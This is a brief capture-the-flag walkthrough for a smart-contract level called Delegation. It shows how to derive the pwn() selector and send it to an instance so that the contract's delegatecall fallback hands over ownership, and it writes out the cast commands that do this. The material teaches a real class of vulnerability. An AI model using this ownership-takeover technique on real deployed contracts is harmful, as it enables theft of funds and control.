
### Challenge 06 | Delegation 
- [Contract](script/06_Delegation.s.sol)
To call the pwn() function in the Delegate contract:

1. Derive the function selector from its signature:
   `keccak256("pwn()")` and get first 4 bytes

   Using Foundry:
   ```
   ❯ cast sig "pwn()"
   0xdd365b8b
   ```

2. Send a transaction to the Delegation contract 
   with calldata:
       `0xdd365b8b`

3. Inside fallback(), msg.data (0xdd365b8b) is forwarded via delegatecall:
```
       address(delegate).delegatecall(msg.data);
```

   - This executes Delegate.pwn() in the context of Delegation.
```
cast send $INSTANCE_ADDRESS "0xdd365b8b" \ 
--rpc-url $RPC_URL --private-key $PRIVATE_KEY 
```

4. Because delegatecall preserves storage context, any state changes
   (e.g., owner = msg.sender) will affect the Delegation contract,
   not the Delegate contract. 

